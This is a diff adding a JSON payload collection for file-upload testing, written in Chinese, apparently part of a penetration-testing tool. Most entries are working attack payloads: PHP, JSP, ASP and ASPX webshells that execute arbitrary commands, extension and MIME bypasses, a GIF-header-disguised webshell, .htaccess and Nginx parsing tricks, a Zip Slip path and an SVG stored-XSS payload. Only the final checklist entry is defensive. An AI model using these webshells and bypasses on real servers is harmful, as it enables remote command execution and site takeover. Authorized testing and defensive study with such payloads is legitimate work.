@@ -1,0 +1,173 @@
+{
+  "kind": "payload",
+  "version": 1,
+  "group": "文件上传",
+  "categories": ["PHP 场景", "JSP 场景", "ASP 场景", "内容绕过", "解析与配置"],
+  "items": [
+    {
+      "id": "upload-php-basic",
+      "title": "PHP 一句话木马",
+      "category": "PHP 场景",
+      "code": "<?php @eval($_POST['cmd']); ?>",
+      "desc": "最基础的 PHP 上传验证代码，仅用于授权测试环境。",
+      "tags": ["upload", "php", "webshell"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP File Upload Cheat Sheet"
+    },
+    {
+      "id": "upload-php-short",
+      "title": "PHP 短标签",
+      "category": "PHP 场景",
+      "code": "<?=`$_GET[0]`?>",
+      "desc": "短标签加反引号执行，适用于 short_open_tag 开启的环境。",
+      "tags": ["upload", "php", "short-tag"],
+      "vars": [],
+      "risk": "attack",
+      "source": "PayloadsAllTheThings"
+    },
+    {
+      "id": "upload-php-phtml",
+      "title": "phtml 后缀",
+      "category": "PHP 场景",
+      "code": "shell.phtml",
+      "desc": "部分 Apache 配置会把 phtml 当 PHP 解析，绕过黑名单只挡 .php 的限制。",
+      "tags": ["upload", "php", "bypass", "extension"],
+      "vars": [],
+      "risk": "attack",
+      "source": "PayloadsAllTheThings"
+    },
+    {
+      "id": "upload-php-htaccess",
+      "title": "上传 .htaccess 改解析",
+      "category": "解析与配置",
+      "code": "AddType application/x-httpd-php .jpg",
+      "desc": "先上传 .htaccess 把 jpg 当 PHP 解析，再上传图片木马。",
+      "tags": ["upload", "php", "htaccess", "apache"],
+      "vars": [],
+      "risk": "attack",
+      "source": "PayloadsAllTheThings"
+    },
+    {
+      "id": "upload-jsp-basic",
+      "title": "JSP 执行代码",
+      "category": "JSP 场景",
+      "code": "<% if(request.getParameter(\"cmd\")!=null){ java.io.InputStream in=Runtime.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream(); int a=-1; byte[] b=new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b,0,a)); } } %>",
+      "desc": "JSP 下执行系统命令并回显，用于授权测试验证上传解析。",
+      "tags": ["upload", "jsp", "webshell"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP File Upload Cheat Sheet"
+    },
+    {
+      "id": "upload-jspx",
+      "title": "jspx 后缀",
+      "category": "JSP 场景",
+      "code": "shell.jspx",
+      "desc": "jspx 为 XML 形式 JSP，部分环境未被加入黑名单。",
+      "tags": ["upload", "jsp", "extension"],
+      "vars": [],
+      "risk": "attack",
+      "source": "PayloadsAllTheThings"
+    },
+    {
+      "id": "upload-asp-basic",
+      "title": "ASP 执行代码",
+      "category": "ASP 场景",
+      "code": "<%eval request(\"cmd\")%>",
+      "desc": "ASP 环境下的代码执行片段，仅用于授权测试。",
+      "tags": ["upload", "asp", "webshell"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP File Upload Cheat Sheet"
+    },
+    {
+      "id": "upload-aspx",
+      "title": "ASPX 执行代码",
+      "category": "ASP 场景",
+      "code": "<%@ Page Language=\"C#\" %><% System.Diagnostics.Process.Start(\"cmd.exe\",\"/c \"+Request[\"cmd\"]); %>",
+      "desc": "ASPX 页面执行命令，注意服务器是否允许进程启动。",
+      "tags": ["upload", "aspx"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP File Upload Cheat Sheet"
+    },
+    {
+      "id": "upload-content-type",
+      "title": "Content-Type 伪造",
+      "category": "内容绕过",
+      "code": "Content-Type: image/jpeg",
+      "desc": "仅校验 MIME 类型时，把请求头改为图片类型即可绕过。",
+      "tags": ["upload", "bypass", "mime"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP File Upload Cheat Sheet"
+    },
+    {
+      "id": "upload-gif-header",
+      "title": "GIF 文件头伪装",
+      "category": "内容绕过",
+      "code": "GIF89a; <?php @eval($_POST['cmd']); ?>",
+      "desc": "在文件头加入 GIF89a 绕过内容检测，需配合解析漏洞使用。",
+      "tags": ["upload", "bypass", "magic"],
+      "vars": [],
+      "risk": "attack",
+      "source": "PayloadsAllTheThings"
+    },
+    {
+      "id": "upload-double-extension",
+      "title": "双后缀绕过",
+      "category": "内容绕过",
+      "code": "shell.php.jpg",
+      "desc": "部分环境按第一个点截断解析，或 Nginx 配置缺陷导致解析为 PHP。",
+      "tags": ["upload", "bypass", "extension"],
+      "vars": [],
+      "risk": "attack",
+      "source": "PayloadsAllTheThings"
+    },
+    {
+      "id": "upload-nginx-cve",
+      "title": "Nginx 解析漏洞思路",
+      "category": "解析与配置",
+      "code": "shell.jpg/x.php",
+      "desc": "老版本 Nginx 的 PATH_INFO 解析问题，可把图片当 PHP 执行，需确认版本与配置。",
+      "tags": ["upload", "nginx", "cve"],
+      "vars": [],
+      "risk": "attack",
+      "source": "公开 Nginx 解析漏洞资料"
+    },
+    {
+      "id": "upload-zip-slip",
+      "title": "ZIP 解压路径穿越",
+      "category": "解析与配置",
+      "code": "压缩包内条目名使用 ../../../../var/www/html/shell.php",
+      "desc": "解压功能未校验条目路径时可写入任意目录，属于 Zip Slip。",
+      "tags": ["upload", "zip", "traversal"],
+      "vars": [],
+      "risk": "attack",
+      "source": "Snyk Zip Slip 研究"
+    },
+    {
+      "id": "upload-svg-xss",
+      "title": "SVG 存储型 XSS",
+      "category": "内容绕过",
+      "code": "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(document.domain)\"/>",
+      "desc": "允许上传 SVG 且直接以 image/svg+xml 返回时，可触发存储型 XSS。",
+      "tags": ["upload", "svg", "xss"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP File Upload Cheat Sheet"
+    },
+    {
+      "id": "upload-check-list",
+      "title": "上传点检查清单",
+      "category": "解析与配置",
+      "code": "1. 后缀白名单是否严格  2. 是否校验文件内容  3. 上传目录是否可执行  4. 是否重命名  5. 是否可跨目录写入",
+      "desc": "逐项核对，避免只看单一维度导致漏测。",
+      "tags": ["upload", "checklist"],
+      "vars": [],
+      "risk": "low",
+      "source": "OWASP File Upload Cheat Sheet"
+    }
+  ]
+}
